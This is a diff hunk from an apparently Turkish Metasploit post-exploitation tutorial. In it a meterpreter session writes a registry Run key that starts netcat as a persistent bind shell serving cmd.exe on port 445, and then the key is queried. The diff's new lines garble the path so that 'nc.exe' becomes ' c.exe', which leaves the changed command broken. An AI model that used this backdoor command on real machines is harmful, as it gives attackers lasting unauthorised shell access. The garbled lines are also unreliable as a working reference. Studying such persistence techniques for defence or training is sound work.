@@ -111,13 +111,13 @@ Komut çıktısında görüldüğü gibi şu an için `VMware Tools, VMware User
 
 
 ```bash
-meterpreter **&gt;** reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe'
+meterpreter **&gt;** reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32 c.exe -Ldp 445 -e cmd.exe'
 Successful set nc.
 meterpreter **&gt;** reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
 Key: HKLM\software\microsoft\windows\currentversion\Run
 Name: nc
 Type: REG_SZ
-Data: C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe
+Data: C:\windows\system32 c.exe -Ldp 445 -e cmd.exe
 ```
 
 
